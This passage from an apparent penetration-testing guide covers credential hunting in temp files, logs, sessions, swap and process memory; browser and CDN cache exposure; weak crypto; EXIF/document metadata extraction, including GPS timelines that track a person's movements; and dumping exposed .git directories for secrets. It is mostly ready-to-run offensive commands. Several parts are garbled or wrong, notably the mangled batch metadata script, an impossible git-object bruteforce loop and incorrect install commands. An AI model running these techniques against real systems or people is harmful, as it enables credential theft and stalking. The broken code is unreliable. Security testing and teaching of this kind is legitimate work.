# Example vulnerable output:
# -rw-r--r-- root root config.php
# Everyone can read this file

# Search for world-readable files with sensitive content
find /var/www -type f -perm -004 -exec grep -l "password\|key\|secret" {} \;

# Search for files with overly permissive ownership
find /home -type f -owner www-data -group www-data
# Web server shouldn't own user home directory files

# Check for SUID binaries that might leak data
find / -perm -4000 2>/dev/null | head -20
```

**Temp File Storage**

```bash
# Sensitive data often left in temp directories
ls -la /tmp/
ls -la /var/tmp/
ls -la /dev/shm/

# Search for sensitive data in temp
find /tmp -type f -exec grep -l "password\|api.*key\|secret\|token" {} \;

# Check for session files
ls -la /var/lib/php/sessions/
grep -r "password" /var/lib/php/sessions/

# Check for application-specific temp
ls -la /tmp/tomcat*/
ls -la /tmp/upload*/
```

**Swap and Memory Files**

```bash
# Check if swap contains sensitive data
strings /proc/[PID]/maps | grep -i heap
cat /proc/[PID]/maps  # View process memory layout

# Dump process memory (if privileged)
gdb -p [PID]
(gdb) dump memory /tmp/memdump 0x[start_addr] 0x[end_addr]
(gdb) quit

# Search dumped memory for credentials
strings /tmp/memdump | grep -iE "password|key|secret|token"

# Check swap for sensitive data (if accessible)
strings /proc/swaps
# If encrypted: mount should show encryption status
mount | grep swap

# Unencrypted swap example:
strings /dev/dm-0 | grep -iE "password|api.*key"
```

**Log File Analysis**

```bash
# Application logs often contain sensitive data
cat /var/log/apache2/access.log | grep -iE "password|api.*key|token"

# Example vulnerable log entries:
# GET /login?username=admin&password=Admin123! HTTP/1.1
# POST /api/auth Authorization: Bearer abc123xyz

# Application error logs
cat /var/log/app/error.log | grep -iE "mysql_connect.*password"
# Error: mysql_connect("localhost", "root", "DbPassword123")

# Check debug logs
find /var/log -name "*debug*" -exec grep -l "password\|secret" {} \;

# Check application-specific logs
cat /var/www/html/logs/*.log | grep -iE "password|key|secret"

# Archive logs for analysis
tar -czf logs_backup.tar.gz /var/log/
# Extract and search
tar -xzf logs_backup.tar.gz
grep -r "password" . | head -20
```

### Web Application Cache

**Browser Cache Exploitation**

```bash
# Sensitive pages cached by browser
# Check browser cache directories

# Firefox
ls -la ~/.mozilla/firefox/*/cache*
strings ~/.mozilla/firefox/*/cache*/cache_data.db | grep -iE "password|secret"

# Chrome
ls -la ~/.cache/google-chrome/Default/Cache*
strings ~/.cache/google-chrome/Default/Cache*/data_0 | grep -iE "password|secret"

# Safari
ls -la ~/Library/Safari/
strings ~/Library/Safari/TopSites.plist | grep -E "password"

# Test browser caching via headers
curl -I https://target.com/admin/dashboard

# VULNERABLE headers:
# Cache-Control: public  (anyone can cache)
# Cache-Control: max-age=3600  (cached for 1 hour)
# Missing: Cache-Control: no-store, no-cache, must-revalidate

# PROPER headers:
# Cache-Control: no-store, no-cache, must-revalidate, max-age=0
# Pragma: no-cache
# Expires: 0
```

**Proxy Cache Exposure**

```bash
# HTTP caches (proxies, CDN) may cache sensitive content

# Check for Cache-Control headers
curl -v https://target.com/api/user/profile 2>&1 | grep -i "cache"

# Test if response cached
# Send HEAD request to see Cache-Control without body
curl -I https://target.com/api/user/profile | grep -i cache

# VULNERABLE patterns:
# No Cache-Control header on sensitive endpoints
# Cache-Control: public on authenticated endpoints
# Cache-Control: private without no-store on sensitive data

# Check Age header (indicates cached response)
curl -I https://target.com/page | grep -i "^age:"
# Age: 3600  means response served from cache

# Test caching with curl
curl -v https://target.com/sensitive/page 2>&1 | grep -iE "cache|age|via"

# If sensitive page cached, attacker can:
# 1. Access cached version via proxy
# 2. Access from shared cache on shared hosting
# 3. Intercept cached response
```

**CDN Cache Poisoning**

```bash
# Some CDNs cache authenticated responses if headers missing

# Test CDN cache by checking headers
curl -I https://cdn.target.com/api/user/data

# Check for:
# X-Cache: HIT           (was cached)
# X-Cache: MISS          (not cached, served from origin)
# Cache-Key: ...         (reveals cache key)
# Via: CloudFlare        (reveals CDN)

# Try accessing with different authentication
curl -I -H "Authorization: Bearer token123" https://cdn.target.com/api/user/data
curl -I https://cdn.target.com/api/user/data  # Without auth

# If both return 200, authenticated response was cached (VULNERABLE)

# Bypass authentication via cache poisoning
# 1. Request sensitive endpoint without auth header
# 2. If cached and returned without 401, data compromised
```

### Encryption Key Management

**Hardcoded Encryption Keys**

```bash
# Search for encryption keys in source code
grep -r "encryption_key\|secret_key\|cipher_key" .

# Common patterns in multiple languages

# PHP
grep -r "define('ENCRYPTION_KEY'" .
grep -r "const ENCRYPTION_KEY" .
grep -r "mcrypt_encrypt.*key.*=" .

# Python
grep -r "SECRET_KEY = " .
grep -r "encryption_key = " .
grep -r "cipher_key = " .

# Node.js
grep -r "const.*key.*=.*require\|process.env" .
grep -r "secretKey:" .
grep -r "encryptionKey:" .

# Java
grep -r "private static.*KEY" .
grep -r "SecretKeySpec" .

# Ruby
grep -r "SECRET_KEY_BASE" .
grep -r "ENCRYPTION_KEY" .

# Example vulnerable code:
# const ENCRYPTION_KEY = "hardcoded_key_12345";
# $conn->encryptionKey = "MySecretKey123";
# SECRET_KEY = "django_insecure_abc123xyz"
```

**Key Derivation Weakness**

```bash
# Weak key derivation allows offline cracking

# MD5-based key derivation (VULNERABLE)
python3 << 'EOF'
import hashlib

password = "weak_password"
key = hashlib.md5(password.encode()).digest()
print(f"Key: {key.hex()}")

# Attacker can crack by brute force
# for each word in wordlist:
#     derive_key_md5(word)
#     if matches_database_key: password_found
EOF

# SHA1-based (still weak)
python3 << 'EOF'
import hashlib

password = "weak_password"
key = hashlib.sha1(password.encode()).digest()
print(f"Key: {key.hex()}")
EOF

# Proper key derivation with PBKDF2
python3 << 'EOF'
import hashlib
import secrets

salt = secrets.token_bytes(32)
password = "strong_password"

# PBKDF2 with 100,000 iterations
key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
print(f"Salt: {salt.hex()}")
print(f"Key: {key.hex()}")

# Attacker would need to crack 100,000 hashes per guess (much harder)
EOF

# Test for weak derivation
grep -r "md5(.*password" .
grep -r "sha1(.*password" .

# Should see PBKDF2, bcrypt, scrypt, or argon2
grep -r "pbkdf2\|scrypt\|argon2" .
```

**Encryption Algorithm Weakness**

```bash
# Identify weak encryption algorithms in code

# Vulnerable algorithms:
# - DES (56-bit, broken)
# - 3DES (still in use, but weak)
# - RC4 (stream cipher, broken)
# - MD5 (hash, not encryption, but often used incorrectly)

# Search for weak algorithms
grep -r "DES\|Triple.*DES\|RC4" .
grep -r "Cipher.getInstance.*DES" .

# Example vulnerable Java code:
# Cipher cipher = Cipher.getInstance("DES");
# cipher.init(Cipher.ENCRYPT_MODE, key);

# Search for proper algorithms
grep -r "AES.*256\|ChaCha20\|AES-GCM" .

# Example proper code:
# Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
# cipher.init(Cipher.ENCRYPT_MODE, key, gcmSpec);
```

**Encryption Mode Weaknesses**

```bash
# ECB mode (Electronic Codebook) is vulnerable

# Vulnerable: Same plaintext always produces same ciphertext
# Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");

# Patterns in encrypted data reveal plaintext structure
# Attacker can:
# 1. Identify identical plaintext blocks
# 2. Build plaintext-ciphertext dictionary
# 3. Decrypt messages without key

# Proper modes with authentication:
# AES/GCM/NoPadding     (Galois Counter Mode, authenticated)
# AES/CBC/PKCS5Padding  (requires IV and authentication)
# ChaCha20-Poly1305     (modern, authenticated)

# Check for vulnerable patterns
grep -r "ECB\|ENCRYPT_MODE.*DES\|Cipher.getInstance.*['\"].*ECB" .

# Example vulnerable code:
# cipher.init(Cipher.ENCRYPT_MODE, key);  # No IV, likely ECB
# Cipher.getInstance("AES/ECB/PKCS5Padding");  # Explicit ECB

# Proper code includes IV:
# IvParameterSpec ivSpec = new IvParameterSpec(iv);
# cipher.init(Cipher.ENCRYPT_MODE, key, ivSpec);
```

### Sensitive Data in Memory

**Memory Dump Analysis**

```bash
# Extract sensitive data from running process memory

# Identify target process
ps aux | grep -i "java\|python\|node\|php" | grep -v grep

# Dump process memory
# Option 1: Using gdb
gdb -p [PID]
(gdb) info proc mappings  # View memory regions
(gdb) dump memory /tmp/heap 0x[heap_start] 0x[heap_end]
(gdb) dump memory /tmp/stack 0x[stack_start] 0x[stack_end]
(gdb) quit

# Option 2: Using dd (direct /proc/mem access)
dd if=/proc/[PID]/mem of=/tmp/memdump bs=1

# Option 3: Using volatility (memory forensics)
volatility -f memdump imageinfo
volatility -f memdump pslist
volatility -f memdump memdump -p [PID] -D /tmp/

# Search dumped memory for sensitive data
strings /tmp/heap | grep -iE "password|api.*key|secret|token|credit"

# Search for specific patterns
strings /tmp/memdump | grep -E "^[A-Za-z0-9_-]{32,}$"  # Potential keys
strings /tmp/memdump | grep -E "^[0-9]{4}-[0-9]{4}-[0-9]{4}-[0-9]{4}$"  # Credit cards
```

**Pointer Dereference Exploitation**

```bash
# Use memory debugging tools to extract sensitive data

# Python memory inspection
python3 << 'EOF'
import sys
import gc

# Force garbage collection
gc.collect()

# Get objects containing sensitive data
for obj in gc.get_objects():
    if isinstance(obj, str):
        if any(keyword in obj.lower() for keyword in ['password', 'key', 'secret', 'token']):
            print(f"Found: {obj}")

# Get memory address
print(f"Memory address: {id(obj)}")
EOF

# Java memory inspection (using jcmd and jmap)
jps  # List Java processes

# Generate heap dump
jmap -dump:live,format=b,file=heap.bin [PID]

# Analyze with Eclipse Memory Analyzer
# Use mat command or GUI to analyze heap.bin

# Search for string values
strings heap.bin | grep -iE "password|secret|key"
```

---

## Metadata Extraction (EXIF, Metadata)

Metadata embedded in files (images, documents, audio, video) often contains sensitive information revealing location, timestamps, software versions, author details, and other PII.

### Image EXIF Analysis

**EXIF Data Extraction**

```bash
# Install exiftool
apt install exiftool

# Extract all EXIF data from image
exiftool photo.jpg

# Common sensitive EXIF tags:
# - GPS Position (latitude/longitude)
# - GPS Altitude
# - GPS DateStamp / GPS TimeStamp
# - DateTime Original (creation time)
# - Make (camera model)
# - Model (device model)
# - Orientation (device orientation at capture)
# - Software (application used)
# - Artist / Author
# - Copyright
# - User Comment

# Extract specific tags
exiftool -GPS* photo.jpg
exiftool -DateTime* photo.jpg
exiftool -UserComment photo.jpg

# Extract to JSON for processing
exiftool -json photo.jpg > metadata.json

# Search JSON for sensitive data
cat metadata.json | jq '.[].GPS*'
cat metadata.json | jq '.[].Copyright'
```

**Batch EXIF Extraction**

```bash
# Extract EXIF from all images in directory
exiftool *.jpg > all_metadata.txt

# Extract specific format
exiftool -csv *.jpg > metadata.csv

# Extract GPS data to KML (viewable in Google Earth)
exiftool -n -a -G1 -s -ee *.jpg | grep GPS | exiftool -csv > gps_coords.csv

# Generate KML from GPS coordinates
python3 << 'EOF'
import csv
import json

kmls = """<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <Folder>
"""

with open('gps_coords.csv') as f:
    reader = csv.DictReader(f)
    for row in reader:
        if 'GPSLatitude' in row and 'GPSLongitude' in row:
            lat = row['GPSLatitude'].strip()
            lon = row['GPSLongitude'].strip()
            filename = row['SourceFile']
            
            kmls += f"""
      <Placemark>
        <name>{filename}</name>
        <Point>
          <coordinates>{lon},{lat}</coordinates>
        </Point>
      </Placemark>
"""

kmls += """
    </Folder>
  </Document>
</kml>
"""

with open('locations.kml', 'w') as f:
    f.write(kmls)
EOF

# View in Google Earth
# Download locations.kml and open with Google Earth
```

**GPS Geolocation Attack**

```bash
# Extract GPS coordinates and identify location

# From EXIF data
exiftool -n -GPS* image.jpg
# Output: GPS Latitude: 37.7749
#         GPS Longitude: -122.4194

# Get location name from coordinates
# Using reverse geocoding service
curl "https://nominatim.openstreetmap.org/reverse?lat=37.7749&lon=-122.4194&format=json"

# Response contains address:
# "San Francisco, California, United States"

# Alternative: Google Maps
# https://maps.google.com/?q=37.7749,-122.4194

# Multiple images with GPS can track movement
for img in *.jpg; do
    echo "=== $img ==="
    exiftool -n -DateTime -GPS* "$img"
done > timeline.txt

# Create timeline showing:
# - Location 1: 10:00 AM
# - Location 2: 2:00 PM
# - Location 3: 6:00 PM
```

**EXIF Removal**

[Inference] If EXIF data persists after attempted removal, the tool may have been ineffective, or data re-embedded after removal.

```bash
# Remove all EXIF data
exiftool -all= output_photo.jpg

# Remove specific tags
exiftool -GPS*= output_photo.jpg

# Strip EXIF with ImageMagick
convert input.jpg -strip output.jpg

# Verify EXIF removed
exiftool output.jpg
# Should show minimal metadata

# Re-add benign EXIF (to avoid suspicion)
exiftool -Copyright="Copyright 2024" -Artist="Anonymous" output.jpg
```

### Document Metadata

**PDF Metadata Extraction**

```bash
# Extract PDF metadata
pdfinfo document.pdf

# Output includes:
# Title
# Author
# Subject
# Creator (application)
# Producer
# CreationDate
# ModDate
# Trapped

# Example sensitive PDF metadata:
# Title: Internal Financial Report Q3 2024
# Author: John Smith (employee name leaked)
# Creator: Microsoft Word 2019
# Subject: Confidential Acquisition Details

# Extract with exiftool
exiftool document.pdf

# Extract raw PDF properties
pdftotext -meta document.pdf -
# Or
strings document.pdf | grep -iE "Author|Creator|Producer|Title|Subject"
```

**Word Document Metadata**

```bash
# Office documents (.docx, .xlsx, .pptx) are ZIP files

# Extract metadata
exiftool document.docx

# Or manually extract
unzip -q document.docx -d extracted/
cat extracted/docProps/core.xml

# XML contains:
# <dc:creator>John Smith</dc:creator>
# <dc:title>Confidential Report</dc:title>
# <dcterms:created>2024-01-15T10:30:00Z</dcterms:created>
# <lastModifiedBy>Jane Doe</lastModifiedBy>

# Look for revision history (detailed edits)
cat extracted/word/document.xml | grep -i "revision\|change\|track"

# Extract revision info
python3 << 'EOF'
import zipfile
import xml.etree.ElementTree as ET

with zipfile.ZipFile('document.docx') as z:
    # Read document
    xml_content = z.read('word/document.xml')
    root = ET.fromstring(xml_content)
    
    # Find tracked changes
    ns = {'w': 'http://schemas.openxmlformats.org/wordprocessingml/2006/main'}
    for ins in root.findall('.//w:ins', ns):
        author = ins.get('{http://schemas.openxmlformats.org/wordprocessingml/2006/main}author')
        date = ins.get('{http://schemas.openxmlformats.org/wordprocessingml/2006/main}date')
        print(f"Inserted by: {author} on {date}")
        print(f"Content: {ET.tostring(ins, encoding='unicode')}")
EOF

# Remove metadata
exiftool -all= output_document.docx
```

**Spreadsheet Metadata**

```bash
# Excel (.xlsx) metadata
unzip -q spreadsheet.xlsx -d extracted/
cat extracted/docProps/core.xml

# Contains:
# - Creator / lastModifiedBy
# - Created / Modified dates
# - Subject / Title
# - Comments

# Extract named ranges (may contain sensitive info)
python3 << 'EOF'
import openpyxl

wb = openpyxl.load_workbook('spreadsheet.xlsx')
print("Named ranges:")
for name in wb.named_ranges:
    print(f"  {name.name}: {name.value}")

# Check for hidden sheets
print("\nSheets:")
for sheet_name in wb.sheetnames:
    sheet = wb[sheet_name]
    print(f"  {sheet_name} (hidden: {sheet.sheet_state})")
EOF

# Extract cell comments
python3 << 'EOF'
import openpyxl

wb = openpyxl.load_workbook('spreadsheet.xlsx')
for sheet in wb.worksheets:
    print(f"Sheet: {sheet.title}")
    for row in sheet.iter_rows():
        for cell in row:
            if cell.comment:
                print(f"  {cell.coordinate}: {cell.comment.text}")
EOF
```

**OpenDocument Metadata**

```bash
# ODP, ODS, ODT (.odt, .ods, .odp) files

# Extract metadata
exiftool document.odt

# Or unzip and check
unzip -q document.odt -d extracted/
cat extracted/meta.xml

# Contains:
# <dc:creator>Author Name</dc:creator>
# <meta:creation-date>2024-01-15T10:30:00</meta:creation-date>
# <meta:initial-creator>Original Author</meta:initial-creator>
# <meta:print-date>...</meta:print-date>

# Look for sensitive content
strings extracted/content.xml | grep -iE "password|secret|key|confidential"
```

### Audio and Video Metadata

**Audio Metadata Extraction**

```bash
# MP3 metadata (ID3 tags)
exiftool audio.mp3

# Common tags:
# Title
# Artist
# Album
# Genre
# Date
# Comment
# Album Artist
# Track Number

# Use ffprobe for detailed analysis
ffprobe -v quiet -print_format json -show_format audio.mp3 | jq '.format.tags'

# Extract with mutagen (Python)
python3 << 'EOF'
from mutagen.mp3 import MP3
from mutagen.id3 import ID3

audio = MP3("audio.mp3")
print("Length:", audio.info.length)

# Get ID3 tags
try:
    tags = ID3("audio.mp3")
    for key, value in tags.items():
        print(f"{key}: {value}")
except:
    print("No ID3 tags found")
EOF

# Remove metadata
ffmpeg -i input.mp3 -c copy -map_metadata -1 output.mp3
```

**Video Metadata Extraction**

```bash
# Extract metadata from video files
exiftool video.mp4

# Common metadata:
# Duration
# Create Date
# Modify Date
# Make (camera/device)
# Model
# GPS Position (if recorded)
# Frame Rate
# Resolution
# Codec

# Detailed with ffprobe
ffprobe -v quiet -print_format json -show_format -show_streams video.mp4 | jq '.format'

# Extract GPS from video
ffmpeg -i video.mp4 2>&1 | grep -i "location"

# Or use exiftool
exiftool -GPS* video.mp4

# Extract frames and analyze
ffmpeg -i video.mp4 -vf fps=1 frame_%04d.jpg

# Check each frame for EXIF
exiftool frame_*.jpg | grep -i GPS
```

### Metadata in Web Assets

**JavaScript Source Maps**

```bash
# JavaScript source maps (.map files) contain original source

# Download source map
curl https://target.com/static/js/app.js.map > app.js.map

# Extract source file names (metadata about structure)
cat app.js.map | jq -r '.sources[]'

# Output might reveal:
# webpack://app/src/config/database.js
# webpack://app/src/auth/admin-panel.js
# webpack://app/src/utils/secrets.js

# This metadata reveals:
# - Internal file structure
# - Authentication systems
# - Configuration locations

# Extract source content
cat app.js.map | jq -r '.sourcesContent[]' | head -50

# Search for embedded metadata
cat app.js.map | jq -r '.sourcesContent[]' | grep -iE "version|author|build.*date"
```

**CSS Source Maps**

```bash
# CSS source maps reveal SCSS/Sass structure

curl https://target.com/static/css/style.css.map > style.css.map

# Extract source files
cat style.css.map | jq -r '.sources[]'

# Might reveal:
# - Internal naming conventions
# - Theme color variables
# - Responsive breakpoints
# - Developer comments

# Extract source content
cat style.css.map | jq -r '.sourcesContent[]'
```

**HTTP Headers Metadata**

```bash
# Check HTTP response headers for informational leakage

curl -I https://target.com

# Headers to check:
# - Server: Apache/2.4.41 (Ubuntu)  (Version info)
# - X-Powered-By: PHP/7.4.3         (Framework version)
# - X-AspNet-Version: 4.0.30319     (ASP.NET version)
# - X-Runtime: 0.234562             (Processing time, system info)
# - X-Generated-By: MyApp/1.0       (Custom software)
# - ETag: "123456-abcdef"           (Cache invalidation data)

# Parse headers
curl -s -I https://target.com | grep -iE "Server|X-Powered|X-AspNet|X-Runtime|X-Generated"
```

**Comments in HTML/CSS/JS**

```bash
# Extract all comments from downloaded resources
curl -s https://target.com | grep -oP '<!--.*?-->'

# Extract from CSS
curl -s https://target.com/style.css | grep -oP '/\*.*?\*/'

# Extract from JavaScript
curl -s https://target.com/app.js | grep -oP '//.*$|/\*.*?\*/'

# Metadata often found in comments:
# <!-- Build date: 2024-01-15 -->
# // TODO: Remove hardcoded password
# /* Version: 3.2.1, Build: 12345 */
# // WARNING: Temporary debug code, DO NOT COMMIT
```

### Batch Metadata Extraction

**Automated Metadata Collection**

```bash
#!/bin/bash
# Comprehensive metadata extraction script

TARGET_DOMAIN="$1"
OUTPUT_DIR="metadata_analysis"

mkdir -p "$OUTPUT_DIR"

echo "[+] Downloading all resources from $TARGET_DOMAIN..."

# Download entire site

wget -r -l 3 -A "jpg,jpeg,png,gif,pdf,docx,xlsx,pptx,mp3,mp4,zip"  
"$TARGET_DOMAIN" -P "$OUTPUT_DIR/downloads" 2>/dev/null

echo "[+] Extracting EXIF from images..." find "$OUTPUT_DIR/downloads" -type f ( -iname "_.jpg" -o -iname "_.png" )  
-exec exiftool {} ; | tee "$OUTPUT_DIR/image_metadata.txt"

echo "[+] Extracting GPS coordinates..." exiftool -n -GPS* "$OUTPUT_DIR/downloads"/**/*.jpg | tee "$OUTPUT_DIR/gps_coordinates.txt"

echo "[+] Analyzing PDF files..." find "$OUTPUT_DIR/downloads" -type f -iname "*.pdf" -exec bash -c ' echo "=== {} ===" pdfinfo "$1" | grep -iE "Title|Author|Subject|Creator|Producer|CreationDate" ' _ {} ; | tee "$OUTPUT_DIR/pdf_metadata.txt"

echo "[+] Analyzing Office documents..." find "$OUTPUT_DIR/downloads" -type f ( -iname "_.docx" -o -iname "_.xlsx" )  
-exec exiftool {} ; | tee "$OUTPUT_DIR/office_metadata.txt"

echo "[+] Extracting audio metadata..." find "$OUTPUT_DIR/downloads" -type f -iname "*.mp3"  
-exec exiftool {} ; | tee "$OUTPUT_DIR/audio_metadata.txt"

echo "[+] Extracting video metadata..." find "$OUTPUT_DIR/downloads" -type f -iname "*.mp4"  
-exec ffprobe -v quiet -print_format json -show_format {} ; |  
jq '.format' | tee "$OUTPUT_DIR/video_metadata.txt"

echo "[+] Analyzing comments in source files..." find "$OUTPUT_DIR/downloads" -type f ( -iname "_.js" -o -iname "_.css" -o -iname "*.html" )  
-exec grep -H "password|secret|api.*key|todo|fixme" {} ; |  
tee "$OUTPUT_DIR/source_comments.txt"

echo "[+] Generating summary report..." cat > "$OUTPUT_DIR/REPORT.txt" << EOF === METADATA EXTRACTION REPORT === Domain: $TARGET_DOMAIN Date: $(date)

[IMAGES] Total images found: $(find "$OUTPUT_DIR/downloads" -type f ( -iname "_.jpg" -o -iname "_.png" ) | wc -l) Images with GPS data: $(grep -c "GPS" "$OUTPUT_DIR/gps_coordinates.txt" 2>/dev/null || echo 0) See: gps_coordinates.txt

[DOCUMENTS] PDFs with metadata: $(grep -c "Title" "$OUTPUT_DIR/pdf_metadata.txt" 2>/dev/null || echo 0) Office documents: $(find "$OUTPUT_DIR/downloads" -type f ( -iname "_.docx" -o -iname "_.xlsx" ) | wc -l) See: pdf_metadata.txt, office_metadata.txt

[MULTIMEDIA] Audio files: $(find "$OUTPUT_DIR/downloads" -type f -iname "_.mp3" | wc -l) Video files: $(find "$OUTPUT_DIR/downloads" -type f -iname "_.mp4" | wc -l)

[SOURCE CODE] Files with suspicious comments: $(grep -c "password|secret|api.*key" "$OUTPUT_DIR/source_comments.txt" 2>/dev/null || echo 0) See: source_comments.txt

EOF

cat "$OUTPUT_DIR/REPORT.txt" echo "[+] Analysis complete. Results in: $OUTPUT_DIR"

````

**ExifTool Advanced Queries**

```bash
# Find all images with GPS coordinates
exiftool -if '$GPSLatitude' -filename -GPS* *.jpg

# Find images taken with specific camera
exiftool -if '$Model =~ /iPhone/' -filename -Model -DateTime *.jpg

# Find recently modified files
exiftool -if '$ModifyDate > "2024:01:15"' -filename -ModifyDate *.pdf

# Export to custom format
exiftool -csv -filename -GPSLatitude -GPSLongitude -DateTime *.jpg > locations.csv

# Find files by author
exiftool -if '$Creator =~ /John/' -filename -Creator *.pdf

# Find files with specific software
exiftool -if '$Software =~ /Photoshop/' -filename -Software *.jpg

# Extract and deduplicate metadata
exiftool -if '$Copyright' -Copyright *.jpg | sort | uniq

# Batch processing with GroupNames
exiftool -G1 -s *.jpg | grep -E "Image|Exif" | sort | uniq
````

---

## Git Repository Exposure

Git repositories (.git directory) contain full version control history including all previous commits, branches, and sensitive data that may have been deleted or modified.

### .git Directory Detection

**Basic Detection**

```bash
# Check for exposed .git directory
curl https://target.com/.git/HEAD

# Returns git reference data if exposed:
# ref: refs/heads/main

# Check for common git files
curl https://target.com/.git/config
curl https://target.com/.git/objects/
curl https://target.com/.git/refs/heads/

# Directory listing (if enabled)
curl https://target.com/.git/

# Test with multiple extensions and paths
for path in .git .git/ .gitconfig git ./.git/HEAD; do
    curl -s -I "https://target.com/$path" | head -1
done

# Automated scanning with Nuclei
nuclei -u https://target.com -t exposures/vcs/
```

**Recursive Directory Traversal**

```bash
# If directory listing disabled, use path traversal
curl https://target.com/.git/objects/
# If 403 Forbidden, try:
curl https://target.com/.git/objects/info/

# Fuzz for hidden git files
ffuf -u https://target.com/.git/FUZZ -w git_wordlist.txt -mc 200,403
# git_wordlist.txt content:
# objects/info/packs
# refs/heads/
# refs/remotes/
# logs/HEAD
# hooks/post-receive
# info/exclude
```

### Git Repository Dumping

**Git-Dumper Tool**

```bash
# Install git-dumper
git clone https://github.com/arthaud/git-dumper.git
cd git-dumper
pip install -r requirements.txt

# Dump repository
python3 git_dumper.py https://target.com/.git output_repo/

# Automatically reconstructs git objects and history
# Output directory contains: .git/objects, refs, logs, etc.

# Or use gittools
python3 gittools/gitdumper.py -u https://target.com/.git -l repo_name
```

**Manual Git Repository Reconstruction**

```bash
# If automated tools fail, manually reconstruct

# Download git objects
# Git objects stored in: .git/objects/[XX]/[YYYYYY...]
# where XX is first 2 hex chars, YYYYYY... is remaining chars

# Create directory structure
mkdir -p repo/.git/objects
mkdir -p repo/.git/refs/heads
mkdir -p repo/.git/refs/remotes

# Download git config
curl https://target.com/.git/config > repo/.git/config

# Download git HEAD
curl https://target.com/.git/HEAD > repo/.git/HEAD

# Enumerate git objects
# Common object hashes to try (bruteforce)
for i in {0..255}; do
    for j in {0..255}; do
        hash=$(printf '%02x%02x' $i $j)
        # Try downloading objects with this prefix
        for k in {0..9999}; do
            object="${hash}$(printf '%012x' $k)"
            curl -s "https://target.com/.git/objects/${hash}/${object:2}" \
              > "repo/.git/objects/$hash/${object:2}" 2>/dev/null
        done
    done
done

# Or use git fsck to find loose objects
cd repo
git fsck --full 2>&1 | grep "dangling\|broken"
```

**GitTools Exploitation**

```bash
# Use extractor from GitTools to pull objects
# https://github.com/internetwache/GitTools

# Extract git repository
python3 GitTools/Extractor/extractor.py -u https://target.com/.git extracted_repo

# Search for sensitive data
cd extracted_repo
git log --all --oneline
git show --name-only
git diff HEAD~1 HEAD  # Show changes in latest commit
```

### Git History Analysis

**Commit Enumeration**

```bash
# List all commits
git log --all --oneline

# View full commit details
git log --all -p

# Search commits for specific keywords
git log --all -p -S "password" --oneline
git log --all -p -S "api_key" --oneline
git log --all -p -S "secret" --oneline
git log --all -p -S "token" --oneline

# Show who committed what
git log --all --format="%H %an %ae %s" --grep="fix\|debug\|remove"

# Find commits with large file changes (possible data dumps)
git log --all --diff-filter=A --find-object --name-only

# Show commits affecting specific files
git log --all -- "config.php" "database.yml" ".env"
```

**Credential Extraction from History**

```bash
# Search all commits for credentials
git log --all -p | grep -iE "password|api.*key|secret|token|credential"

# More focused search with context
git log --all -p | grep -B5 -A5 "password.*=\|api_key.*="

# Extract deleted secrets (important - deleted != gone)
git log --all -p -- "*.env" | grep -iE "password|api|secret|key"

# Example vulnerable commit:
# commit 1a2b3c4d5e6f7g8h9i0j
# Author: dev@company.com
# Date:   Mon Jan 15 10:30:00 2024
# 
#     Remove debug credentials
# 
#     diff --git a/config.php b/config.php
#     -$dbpass = "DatabasePassword123!";
#     -$apikey = "sk_live_abc123xyz";

# Those credentials are now exposed in history!
```

**Branch and Tag Analysis**

```bash
# List all branches
git branch -a

# List all tags
git tag -l

# Check out and examine each branch
for branch in $(git branch -r | grep -v HEAD); do
    git checkout "$branch"
    echo "=== Branch: $branch ==="
    git log --oneline -5
    # Search for secrets in this branch
    git log --all -p | grep -i "password\|secret" | head -5
done

# Compare branches
git diff main staging | grep -i "password\|secret"
git diff main develop | grep -i "password\|secret"

# Find secrets in all refs
git rev-list --all | while read commit; do
    git show "$commit" | grep -iE "password|api.*key|secret|token"
done
```

**Author and Contributor Analysis**

```bash
# Extract contributor information
git shortlog --summary --numbered

# Shows all contributors and commit counts
# Reveals team members and their activity levels

# Get email addresses of contributors
git log --all --pretty=%ae | sort | uniq

# Find commits by specific person
git log --all --author="John Smith" -p

# Analyze commit patterns
git log --all --format="%an %ae %cI" | sort

# Extract commit messages containing sensitive keywords
git log --all --oneline | grep -iE "password|secret|key|admin|login|auth"

# Example dangerous commit messages:
# "Fix admin password bypass"
# "Update API key for production"
# "Temporary hardcoded secret for testing"
```

### Sensitive Data Recovery

**Truffleog Git Analysis**

```bash
# Specialized tool for finding secrets in git history
pip install trufflehog

# Scan cloned repository
trufflehog git file:///path/to/repo --only-verified

# Or scan directly from remote
trufflehog git https://github.com/target/repo.git --only-verified

# Output includes:
# - High entropy strings (likely keys/tokens)
# - Known secret patterns (AWS keys, Stripe keys, etc.)
# - Verified matches (actual valid secrets)

# Custom rules for specific patterns
trufflehog git file:// --rules custom_rules.json
```

**Gitleaks Analysis**

```bash
# Alternative secret scanner
pip install gitleaks

# Scan repository
gitleaks detect --source /path/to/repo --verbose

# Show leaks by type
gitleaks detect --source . | jq '.[] | .RuleID' | sort | uniq -c

# Scan with custom config
gitleaks detect --config leaks.toml --source .

# Example leaks.toml:
# [[rules]]
# id = "api-key"
# pattern = '''api[_-]?key['"=\s]*['"]*[0-9a-zA-Z]{32,}'''
# entropy = 4.5
# keywords = ["api"]
```

**Manual Data Recovery Script**

```bash
#!/bin/bash
# Extract all sensitive data from git history

REPO_PATH="$1"
OUTPUT_FILE="sensitive_data_found.txt"

cd "$REPO_PATH"

# Clear previous results
> "$OUTPUT_FILE"

echo "[+] Scanning git history for sensitive data..." | tee -a "$OUTPUT_FILE"

# Search in all commits
git log --all -p | while IFS= read -r line; do
    # Check for database credentials
    if echo "$line" | grep -qiE "mysql|postgresql|mongodb|redis.*://.*:.*@"; then
        echo "[!] Database connection string: $line" | tee -a "$OUTPUT_FILE"
    fi
    
    # Check for API keys
    if echo "$line" | grep -qiE "api[_-]?key|api[_-]?secret"; then
        echo "[!] API key reference: $line" | tee -a "$OUTPUT_FILE"
    fi
    
    # Check for AWS credentials
    if echo "$line" | grep -qiE "AKIA[0-9A-Z]{16}|aws_secret"; then
        echo "[!] AWS credential: $line" | tee -a "$OUTPUT_FILE"
    fi
    
    # Check for private keys
    if echo "$line" | grep -q "BEGIN.*PRIVATE KEY"; then
        echo "[!] Private key found: $(echo $line | cut -c1-100)" | tee -a "$OUTPUT_FILE"
    fi
    
    # Check for passwords
    if echo "$line" | grep -qiE "password\s*=|passwd\s*=|pwd\s*=" | grep -v "^-"; then
        echo "[!] Password assignment: $line" | tee -a "$OUTPUT_FILE"
    fi
done

